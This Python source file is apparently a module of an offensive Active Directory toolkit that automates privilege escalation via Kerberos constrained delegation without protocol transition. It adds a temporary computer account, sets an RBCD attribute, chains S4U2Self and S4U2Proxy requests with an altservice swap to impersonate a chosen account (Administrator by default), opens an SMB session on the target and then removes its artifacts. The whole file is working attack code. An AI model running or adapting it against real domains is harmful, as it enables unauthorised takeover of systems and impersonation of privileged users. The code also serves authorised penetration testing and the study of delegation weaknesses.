import os
import random
import string

from module import BaseModule
from tool import Tool

class ConstrainedDelegationWithoutProtocolTransition(BaseModule):
    path = "delegation/constrained"
    description = "Privilege Escalation via Constrained Delegation without Protocol Transition"
    info = """If Protocol Transition is not enabled, the delegation principal can only delegate users who have authenticated to it using Kerberos. This means we need a valid Service Ticket (TGS) for the user we want to impersonate.

Prerequisites:
  - Control of a compromised account configured for Constrained Delegation without Protocol Transition (attacker). - This module requires a compromised computer$ account.
  - The msDS-AllowedToDelegateTo attribute of $COMPROMISED_ACCOUNT includes a service SPN (e.g., cifs/target.service.domain) you wish to access (target spn)
  - The compromised account must have the ability to modify its own msDS-AllowedToActOnBehalfOfOtherIdentity attribute
  - A privileged user (e.g., $TARGET_USER) not protected from delegation (i.e., without the "Account is sensitive and cannot be delegated" flag). (tarfget user)"""

    options = {
        "dc_ip": {"default": "", "description": "DC IP or host address. If blank, the domain name will be used.", "required": False},
        "target_account": {"default": "Administrator", "description": "Target account to impersonate.", "required": True},
        "target_spn": {"default": "", "description": "Target SPN of the service that the attacker has delegation rights to.", "required": True},
        "target_host": {"default": "", "description": "Target computer to attempt to compromise.", "required": False},

        "domain":   {"default": "", "description": "Auth: Domain name (FQDN)", "required": True},
        "username": {"default": "", "description": "Auth: Username", "required": True},
        "password": {"default": "", "description": "Auth: Password or NT Hash (for NTLM auth only)", "required": False},
        "auth": {"default": "ntlm", "description": "Auth: Type (ntlm, krb)", "required": True},
    }
    
    def __init__(self, registry, job_manager):
        super().__init__(registry, job_manager)

    def _random_computer_name(self) -> str:
        suffix = "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
        return f"CD{suffix}$"

    def _random_password(self) -> str:
        alphabet = string.ascii_letters + string.digits + "!@#$%^&*"
        return "".join(random.choices(alphabet, k=20))

    def _target_host_from_spn(self, spn: str) -> str:
        if "/" not in spn:
            return ""
        return spn.split("/", 1)[1].split(":", 1)[0].strip()

    async def run(self):
        if not self.validate_options():
            return

        tool = Tool(self)

        os.chdir(self.logs_dir)
        self.opts.dc_ip = self.adutils.get_dc_ip(self.opts.dc_ip, self.opts.domain)
        self.opts.dc_hostname = self.adutils.get_dc_hostname(self.opts.dc_ip, self.opts.domain)
        if not tool.set_auth(from_module=True):
            return

        target_host = self.opts.target_host or self._target_host_from_spn(self.opts.target_spn)
        if not target_host:
            self.pane_a.write("[red][!] Invalid `target_spn`. Expected format like cifs/server.domain.local.[/red]")
            return

        if not self.opts.username.endswith("$"):
            self.pane_a.write("[yellow][!] The attacker account is usually expected to be a computer account ending with `$`.[/yellow]")

        computer_name = self._random_computer_name()
        computer_password = self._random_password()

        tool.title("Create a computer account for the attack")
        if not await tool.add_computer(computer_name, computer_password):
            return

        tool.title("Modify Target's RBCD Attribute")
        if not await tool.add_rbcd(self.opts.username, computer_name):
            return

        tool.title("Perform S4U2Self + S4U2Proxy to obtain a service ticket")
        if not tool.set_auth(auth="ntlm", domain=self.opts.domain, username=computer_name, password=computer_password):
            return
        ticket = await tool.get_st(['-spn', "host/"+self.opts.username.rstrip('$'), '-impersonate', self.opts.target_account])
        
        if not ticket:
            return

        tool.title("Perform S4U2Proxy with altservice to request a usable CIFS ticket")
        if not tool.set_auth(from_module=True):
            return
        ticket = await tool.get_st([
            '-spn', self.opts.target_spn,
            '-altservice', f'cifs/{target_host}',
            '-impersonate', self.opts.target_account,
            '-additional-ticket', str(ticket),
        ])
        if not ticket:
            return

        tool.title("Authenticate to the target service using smbclient")
        if not tool.set_auth(auth="krb", domain=self.opts.domain, username=self.opts.target_account, ticket=ticket):
            return
        await tool.smbclient(target_host)

        tool.title("Clean up attack artifacts")
        if tool.set_auth(from_module=True):
            await tool.remove_rbcd(self.opts.username, computer_name)
            await tool.remove_computer(computer_name)

        self.pane_b.write(
            f"[green bold]Attack successful. Ticket saved in {ticket}. "
            "Cleanup was attempted for RBCD and the temporary computer account; verify deletion if access checks failed.[/green bold]"
        )
